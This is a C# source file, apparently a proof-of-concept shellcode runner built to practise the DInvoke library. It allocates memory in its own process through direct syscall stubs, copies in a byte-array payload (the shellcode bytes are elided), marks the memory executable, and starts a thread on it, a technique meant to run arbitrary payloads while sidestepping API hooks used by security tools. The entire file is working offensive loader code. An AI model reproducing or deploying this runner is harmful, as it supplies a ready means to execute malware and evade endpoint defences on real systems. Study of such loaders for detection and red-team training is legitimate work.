using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;

/*
 * This program is a PoC shellcode runner written to practice using DInvoke. 
 * Compile the dev branch of DInvoke and add the DLL as a reference.
 * @thelikes
 */

namespace DInvokeScRunner
{
    class Program
    {
        static void Main(string[] args)
        {
            // --- payload
            byte[] buf = new byte[606] { 0xfc,[...],0xd5 };

            // size of the decoded buffer
            int size = buf.Length;
            Console.WriteLine("[>] buf.Length: " + size);

            // --- get process ID
            Process thisproc = Process.GetCurrentProcess();
            Console.WriteLine("[>] Current process ID: " + thisproc.Id);

            // --- VirtualAlloc
            Console.WriteLine("\n[>] Press to proceed to VirtualAlloc...");
            var name = Console.ReadLine();

            // setup
            IntPtr syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
            DInvoke.DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory syscallAllocateVirtualMemory = (DInvoke.DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(syscall, typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory));
            
            // exec
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)buf.Length;
            var result = syscallAllocateVirtualMemory(
                thisproc.Handle,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DInvoke.Data.Win32.Kernel32.MEM_COMMIT | DInvoke.Data.Win32.Kernel32.MEM_RESERVE,
                0x04);

            if (result != 0) throw new Win32Exception();
            
            Console.WriteLine("[>] baseAddress: " + String.Format("0x{0:X4}", baseAddress));

            // --- Write buf
            Console.WriteLine("\n[>] Press to proceed to Copy...");
            Console.ReadLine();

            //Marshal.Copy(buf, 0, baseAddress, size);
            var buffer = Marshal.AllocHGlobal(size);
            Marshal.Copy(buf, 0, buffer, size);

            // NtWriteVirtualMemory
            uint bytesWritten = 0;

            syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory");
            DInvoke.DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory ntWriteVirtualMemory = (DInvoke.DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(syscall, typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory));

            result = ntWriteVirtualMemory(
                thisproc.Handle,
                baseAddress,
                buffer,
                (uint)buf.Length,
                ref bytesWritten);

            Console.WriteLine("[>] bytesWritten:" + bytesWritten);

            // NtProtectVirtualMemory
            syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
            DInvoke.DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory syscallProtectVirtualMemory = (DInvoke.DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(syscall, typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory));

            uint oldProtect = 0;

            result = syscallProtectVirtualMemory(
                thisproc.Handle,
                ref baseAddress,
                ref regionSize,
                0x20,
                ref oldProtect);

            Console.WriteLine("[>] syscallProtectVirtualMemory: " + result);

            // --- CreateProcess
            Console.WriteLine("\n[>] Press to proceed to CreateThread...");
            Console.ReadLine();

            // setup
            syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtCreateThreadEx");
            Console.WriteLine("[>] syscall: " + syscall);
            DInvoke.DynamicInvoke.Native.DELEGATES.NtCreateThreadEx syscallCreateThreadEx = (DInvoke.DynamicInvoke.Native.DELEGATES.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(syscall, typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtCreateThreadEx));

            //exec
            Console.WriteLine("[>] baseAddress: " + String.Format("0x{0:X4}", baseAddress));
            IntPtr hThread = IntPtr.Zero;
            syscallCreateThreadEx(
                out hThread, 
                DInvoke.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, 
                IntPtr.Zero,
                thisproc.Handle, 
                baseAddress, 
                IntPtr.Zero, 
                false, 
                0, 
                0, 
                0, 
                IntPtr.Zero);

            Console.WriteLine("[>] hThread: " + hThread);

            // --- WaitForSingleObject
            // > Note, if we use ReadLine here, it doesn't matter if our Nt/WaitForSingleObject is correct as the thread & process will be held up at the prompt.
            //Console.WriteLine("[>] Press to proceed to WaitForSingleObject...");
            //Console.ReadLine();

            // setup
            syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtWaitForSingleObject");
            Console.WriteLine("[>] syscall: " + syscall);
            MYDELEGATES.NtWaitForSingleObject syscallWaitForSingleObject = (MYDELEGATES.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(syscall, typeof(MYDELEGATES.NtWaitForSingleObject));

            // exec
            syscallWaitForSingleObject(hThread, false, IntPtr.Zero);
        }
        public class TinyDinvoke
        {
            //API signature
            public static DInvoke.Data.Native.NTSTATUS NtWaitForSingleObject(IntPtr hHandle, bool Alertable, IntPtr TimeOut)
            {
                object[] funcargs = {
                hHandle,Alertable,TimeOut
                };

                DInvoke.Data.Native.NTSTATUS retvalue = (DInvoke.Data.Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtWaitForSingleObject", typeof(MYDELEGATES.NtWaitForSingleObject), ref funcargs);
                hHandle = (IntPtr)funcargs[0];
                
                return retvalue;
            }
        }
        public class MYDELEGATES
        {
            /*
             * NtWaitForSingleObject(
             *   IN HANDLE ObjectHandle, 
             *   IN BOOLEAN Alertable, 
             *   IN PLARGE_INTEGER TimeOut OPTIONAL);
             */

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate DInvoke.Data.Native.NTSTATUS NtWaitForSingleObject(
                IntPtr hHandle,
                bool Alertable,
                IntPtr Timeout);
        }
    }
}